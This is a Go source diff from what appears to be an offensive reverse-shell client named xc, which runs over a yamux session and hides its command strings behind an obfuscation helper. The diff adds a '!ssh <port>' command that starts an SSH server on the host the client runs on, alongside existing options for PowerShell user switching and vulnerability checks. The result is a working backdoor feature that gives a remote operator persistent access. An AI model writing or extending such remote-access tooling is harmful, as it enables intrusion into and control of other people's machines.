@@ -11,6 +11,7 @@ import (
 	"os"
 	//"syscall"
 	"time"
+	"strconv"
 
 	"../plugins"
 	"../shell"
@@ -75,6 +76,8 @@ func Run(s *yamux.Session, c net.Conn) {
 			help += utils.Bake("§    * restart xc with the specified user using powershell§")+ "\n"
 			help += utils.Bake("§  !vulns\n§")
 			help += utils.Bake("§    * checks for common vulnerabilities§")+ "\n"
+			help += utils.Bake("§  !ssh <port>\n§")
+			help += utils.Bake("§    * start ssh server on the specified port§")+ "\n"
 
 			handled := handleSharedCommand(s, c, argv, help, homedir)
 			// os specific commands
@@ -108,6 +111,18 @@ func Run(s *yamux.Session, c net.Conn) {
 					shellCmd.Start()
 					shellCmd.Wait()
 					//log.Println("Exiting PowerShell (exit)")
+					prompt(c)
+				case utils.Bake("§!ssh§"):
+					if len(argv) == 2 {
+						port, err := strconv.Atoi(argv[1])
+						if err == nil {
+							shell.StartSSHServer(port, c)
+						} else {
+							fmt.Println(err)
+						}
+					} else {
+						c.Write([]byte("Usage: !ssh <port>\n"))
+					}
 					prompt(c)
 				case utils.Bake("§!rc§"):
 					if len(argv) == 2 {
